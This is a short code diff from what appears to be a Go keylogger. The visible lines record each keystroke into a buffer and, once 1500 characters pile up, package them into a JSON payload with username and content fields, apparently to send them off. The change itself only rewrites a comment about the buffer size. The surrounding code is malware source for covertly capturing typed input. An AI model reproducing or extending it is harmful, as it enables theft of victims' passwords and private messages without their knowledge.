@@ -36,7 +36,7 @@ func main() {
 			buffer.WriteString(strconv.QuoteRune(key.Rune))
 		}
 
-		if len(buffer.String()) >= 1500 { // 1 char = 3 len, max send is 2k, 2*3 = 6, so gone with 5 to be safe
+		if len(buffer.String()) >= 1500 { // this can probs be increased, got bored of testing
 			type Payload struct {
 				Username string `json:"username"`
 				Content  string `json:"content"`
